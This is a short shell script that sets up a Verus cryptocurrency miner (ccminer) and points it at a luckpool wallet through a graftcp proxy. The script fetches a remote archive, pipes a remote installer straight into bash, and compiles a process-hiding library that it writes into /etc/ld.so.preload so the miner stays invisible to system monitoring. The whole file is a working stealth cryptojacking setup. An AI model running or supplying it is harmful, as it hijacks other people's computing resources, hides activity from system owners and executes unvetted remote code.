apt update;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git;

wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicCCm.zip
unzip magicCCm.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installer.sh | bash

git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
chmod +x ccminer/build.sh
chmod +x ccminer/configure.sh
chmod +x ccminer/autogen.sh
cd ccminer
./autogen.sh
./build.sh

graftcp ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RYF4zmgp9dbN2ktHxQMqmzPXtWDhSrQFUL.Nvidia -p x
